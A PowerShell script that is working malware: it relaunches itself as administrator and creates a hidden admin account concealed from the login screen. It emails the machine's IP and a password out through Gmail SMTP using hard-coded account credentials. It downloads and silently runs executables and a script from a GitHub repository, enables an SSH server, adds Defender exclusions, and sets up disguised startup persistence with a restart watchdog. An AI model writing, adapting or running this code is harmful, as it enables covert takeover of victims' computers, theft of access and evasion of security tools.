function random_text {
    return -join ((97..122)+(65..90) | Get-Random -Count 5 | % {[char]$_})
}

# --- REQUIRED VARIABLES (REPLACE VALUES) ---
Set-Variable -Name PublicIP -Value (Invoke-RestMethod -Uri "https://api.ipify.org")
Set-Variable -Name email -Value "loirverse@gmail.com"  
Set-Variable -Name emailPassword -Value "kfjnnlovftazuxkk"  

if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Exit
} else {
    # STEALTH ADMIN ACCOUNT CREATION
    Set-Variable -Name username -Value "TBuG"
    Set-Variable -Name Password -Value (ConvertTo-SecureString ".V3n0m" -AsPlainText -Force)
    
    # Create account with minimal footprint
    New-LocalUser $username -Description " " -FullName " " -Password $Password -ErrorAction SilentlyContinue
    Add-LocalGroupMember -Member $username -Group "Administrators" -ErrorAction SilentlyContinue

    # Hide from all user lists
    Set-LocalUser -Name $username -Description " " -FullName " " -ErrorAction SilentlyContinue

    # Hide from login screen
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    New-ItemProperty -Path $regPath -Name $username -Value 0 -PropertyType DWORD -Force | Out-Null
}

# --- MAIN SCRIPT ---
Set-Variable -Name wd -Value (random_text)
Set-Variable -Name path -Value "$env:temp\$wd"
Set-Variable -Name INITIALPATH -Value (Get-Location)
Set-Variable -Name "initial_dir" -Value "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Accessories"

# Configuration file setup
Set-Variable -Name configfile -Value ("$env:UserName.rat")
Set-Content -Path $configfile -Value ""
Add-Content -Value $PublicIP -Path $configfile
Add-Content -Path $configfile -Value $Password
Add-Content -Value $INITIALPATH -Path $configfile
Add-Content -Value $env:temp -Path $configfile

$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
$plainPassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword))
Add-Content -Value $plainPassword -Path $configfile

# Email with separate credentials
$emailCreds = New-Object System.Management.Automation.PSCredential ($email, (ConvertTo-SecureString $emailPassword -AsPlainText -Force))
Send-MailMessage `
    -Credential $emailCreds `
    -Port 587 `
    -From $email `
    -Subject "IP Address Notification from $env:UserName" `
    -UseSsl `
    -To $email `
    -SmtpServer "smtp.gmail.com" `
    -Attachment $configfile

Remove-Item -Path $configfile -Force

# Download and setup
mkdir $path -Force | Out-Null
cd $path

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/scanner.ps1" -UseBasicParsing -OutFile "AEQKCPrkuifY.ps1"
#Invoke-WebRequest -Uri "https://github.com/Drakovthe6th/TBuG/raw/refs/heads/master/Advance.exe" -UseBasicParsing -OutFile "Advance.exe"
Invoke-WebRequest -Uri "https://github.com/Drakovthe6th/TBuG/raw/refs/heads/master/SystemMonitor.exe" -UseBasicParsing -OutFile "SystemMonitor.exe"

#Start-Process -FilePath "$path\Advance.exe" -ArgumentList "/silent", "/install" -Wait

# SSH Setup
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction SilentlyContinue
Start-Service sshd -ErrorAction SilentlyContinue
Set-Service -StartupType 'Automatic' -Name sshd -ErrorAction SilentlyContinue

# Hidden task setup
$tasks = "C:\ProgramData\Microsoft\Windows"
Move-Item -Path "$path\AEQKCPrkuifY.ps1" -Destination $tasks -Force
attrib.exe +h +s "$tasks\AEQKCPrkuifY.ps1"
Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tasks\AEQKCPrkuifY.ps1`""

Start-Sleep -Seconds 30
Start-Process -FilePath "$path\SystemMonitor.exe" -ArgumentList "/silent", "/install" -Wait

# Malware deployment
mkdir "$initial_dir\mall" -Force | Out-Null
Invoke-WebRequest -OutFile "$path\mall.zip" -Uri "https://github.com/Drakovthe6th/TBuG/raw/refs/heads/master/mall.zip"
Expand-Archive -Path "$path\mall.zip" -DestinationPath "$initial_dir\mall" -Force
attrib.exe +h +s "$initial_dir\mall"

# Hide user directory (replace ... with actual path)
Set-Location -Path 'C:\Users'
$userDir = "TBuG"  # CHANGE TO TARGET DIRECTORY
if (Test-Path -Path $userDir -PathType Container) {
    attrib.exe +h +s +r $userDir
}

# Security exclusions
cd $initial_dir
Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue

# ====== NEW PERSISTENCE & MONITORING LOGIC ======
$targetExe = "$initial_dir\mall\Microsoft@OfficeTempletes.exe"
$processName = "Microsoft@OfficeTempletes"

# 1. Add to Windows startup
$startupPath = [Environment]::GetFolderPath("Startup")
$shortcutPath = Join-Path $startupPath "Microsoft Office Templates.lnk"
$WshShell = New-Object -ComObject WScript.Shell
$shortcut = $WshShell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = $targetExe
$shortcut.Arguments = "/silent /install"
$shortcut.WorkingDirectory = "$initial_dir\mall"
$shortcut.Save()
attrib.exe +h +s $shortcutPath  # Hide shortcut

# 2. Check if process is running
$processRunning = Get-Process -Name $processName -ErrorAction SilentlyContinue

if (-not $processRunning) {
    # 2A. Start if not running
    Start-Process -FilePath $targetExe -ArgumentList "/silent", "/install"
    $processRunning = $true
}

# 3. Monitor for 5 minutes if running
if ($processRunning) {
    $monitorDuration = 300  # 5 minutes
    $stableDuration = 0
    $checkInterval = 10     # Check every 10 seconds
    
    for ($i = 0; $i -lt ($monitorDuration / $checkInterval); $i++) {
        $currentProcess = Get-Process -Name $processName -ErrorAction SilentlyContinue
        
        if ($currentProcess) {
            $stableDuration += $checkInterval
            # Exit if stable for 5 minutes
            if ($stableDuration -ge $monitorDuration) {
                exit
            }
        } else {
            # 3B. Process stopped - kill any remnants and restart
            Stop-Process -Name $processName -Force -ErrorAction SilentlyContinue
            Start-Process -FilePath $targetExe -ArgumentList "/silent", "/install"
            $stableDuration = 0  # Reset stability timer
        }
        Start-Sleep -Seconds $checkInterval
    }
}

# Cleanup
Remove-Item -Path "$initial_dir\ip.txt" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$initial_dir\NzKnmxLrbsBw.txt" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$initial_dir\PkUbTvqXFIdB.txt" -Force -ErrorAction SilentlyContinue

exit